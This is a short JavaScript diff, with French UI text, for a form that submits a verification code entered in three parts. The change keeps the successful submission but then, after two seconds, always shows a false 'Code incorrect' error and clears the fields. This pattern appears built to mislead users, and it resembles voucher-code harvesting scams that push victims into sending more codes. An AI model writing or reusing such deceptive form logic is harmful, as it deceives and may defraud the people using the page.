@@ -91,20 +91,31 @@ verificationForm.addEventListener("submit", function(e){
         }
     )
 
-    .then(function(){
+    
 
-        result.innerHTML = "Votre demande a été envoyée.";
+      .then(function(){
 
-        part1.value = "";
-        part2.value = "";
-        part3.value = "";
+    // Premier message (vert)
+    result.innerHTML = "✅ Votre demande est en cours de traitement.";
+    result.className = "success";
 
-        grecaptcha.reset();
+    // Deuxième message après 2 secondes (rouge)
+    setTimeout(function(){
 
-        part1.focus();
+        result.innerHTML = "❌ Code incorrect.";
+        result.className = "error";
 
-    })
+    }, 2000);
 
+    part1.value = "";
+    part2.value = "";
+    part3.value = "";
+
+    grecaptcha.reset();
+
+    part1.focus();
+
+})
 
     .catch(function(error){
 
